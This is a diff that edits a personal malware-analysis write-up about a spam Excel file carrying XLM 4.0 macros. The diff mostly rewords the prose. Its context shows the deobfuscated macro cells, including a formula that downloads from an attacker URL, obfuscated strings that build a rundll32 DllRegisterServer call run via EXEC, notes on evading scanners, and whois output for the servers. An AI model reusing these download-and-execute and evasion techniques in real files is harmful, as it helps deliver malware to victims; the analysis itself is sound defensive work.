@@ -322,12 +322,13 @@ Replacing the cell references reveals those URLs:
 |sheet1|AO276|HERTY(0,"http://44276.7967810764.dat","..\Kiod.hod4",0,0)|
 
 Only the first three are valid URLs.
-I tried downloading the files through [Tor](https://en.wikipedia.org/wiki/Tor_%28anonymity_network%29) out of curiosity but only got error codes.
+I tried downloading the files through [Tor](https://en.wikipedia.org/wiki/Tor_%28anonymity_network%29)
+but didn't have any luck.
 The first and third returned 403: Forbidden.
 The second refused connections.
 
-I'm thinking this is some kind of timed attack that cuts off a few days of sending the email.
-That way, the attacker can hit some victims but avoid detection by malware analyzers.
+This must be some kind of timed attack that cuts off a few days of sending the email.
+That way, the attacker can hit some victims but avoid proper detection by malware analyzers.
 
 #### Deobfuscation
 
@@ -340,22 +341,23 @@ It is a niche Excel antipattern; regular functions only read values from other c
 |sheet1|AO264|FORMULA.FILL(AL99&"undll32 ",AP264)|AP264|Rundll32 |
 |sheet1|AO265|FORMULA.FILL(","&AL101&AL113&AL113&AL99&AL114&"gisterServer",AP265)|AP265|,DllRegisterServer|
 
-This shed some light on the end goal. The payload download is a [DLL](https://techterms.com/definition/dll) and would be run with
+This shed some light on the end goal. The payload is a [DLL](https://techterms.com/definition/dll) to be executed with
 [rundll32](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/rundll32).
-These cells were probably obfuscated to avoid detection by heuristic-based virus scanners.
+These cells are obfuscated to avoid detection by heuristic virus scanners.
+More complex scanners evaluating the worksheet in a sandbox might overlook this because of FORMULA.FILL.
 
 #### Running the Payload :bomb:
 
-X213 through X215 looked like a doozy but weren't all that bad; it's just another case of obfuscation.
+X213 through X215 look painful but are just another case of obfuscation.
 
-The chain of functions delimited by equal signs will be called from right to left as long as function outputs are equal.
-It's basically a shorthand for if statements with no else clause.
+The chain functions delimited by equal signs will be called from right to left as long as function outputs are equal.
+In other words, it is a shorthand for if statements with no else clause.
 
 EXEC is an XLM macro function for starting another program in the background.
 
-The [COUNTBLANK]([COUNTBLANK](https://support.microsoft.com/en-us/office/countblank-function-6a92d772-675c-4bee-b346-24af6bd3ac22)) function, as the name suggests, counts the number of blank cells in a range.
-So `COUNTBLANK(V201:V224)` is really just 25 since all those cells are blank.
-Thus, they could be safely removed when simplifying things:
+[COUNTBLANK]([COUNTBLANK](https://support.microsoft.com/en-us/office/countblank-function-6a92d772-675c-4bee-b346-24af6bd3ac22)), as the name suggests, counts the number of blank cells in a range.
+So `COUNTBLANK(V201:V224)` equals 25 since all those cells are blank
+and can be safely removed when simplifying things:
 
 | Sheet | Address | Simplified Value | Evaluated |
 |--|--|--|--|
@@ -367,7 +369,7 @@ So one or more copies of the attacker's DLLs would run and the Excel worksheet w
 
 ### Servers
 
-The only clue I had left was the servers for downloading the payload.
+Without the payload, the only clue I had left was the endpoints for downloading it.
 I ran a [whois](https://en.wikipedia.org/wiki/WHOIS) query on all three:
 
 ```
@@ -387,13 +389,12 @@ descr:          ITLDC EU2.SOF Datacenter Network
 country:        BG
 ```
 
-Three different hosting providers in three different countries. No luck here.
-Then I thought to check open ports with [nmap](https://en.wikipedia.org/wiki/Nmap) and noticed that the Russian and Bulgarian servers had an HTTPS port open.
-Both were using the same expired [SSL certificate](https://www.cloudflare.com/learning/ssl/what-is-an-ssl-certificate/) for cdnmetrics.com.
+Three different hosting providers in three different countries.
+I never expected that an attacker would build in redundancy!
+Checking open ports with [nmap](https://en.wikipedia.org/wiki/Nmap) revealed that the Russian and Bulgarian servers had an HTTPS port open.
+Both had the same expired [SSL certificate](https://www.cloudflare.com/learning/ssl/what-is-an-ssl-certificate/) for cdnmetrics.com.
 The trail went cold from there.
 
 ## Debrief
 
-Overall, analyzing this Excel macro was a fun project. Though I don't know how successful it was; the payload wasn't available so the question I set out to answer remains a mystery.
-Hopefully more spam comes my way soon and I get another opportunity.
-Next time I'll be prepared!
+Analyzing this Excel macro was a fun project overall, but the attacker's goal remains a mystery. Oddly enough I find myself hoping for more spam to come my way. I'm ready for round 2! :man_technologist: :fist_right: :robot:
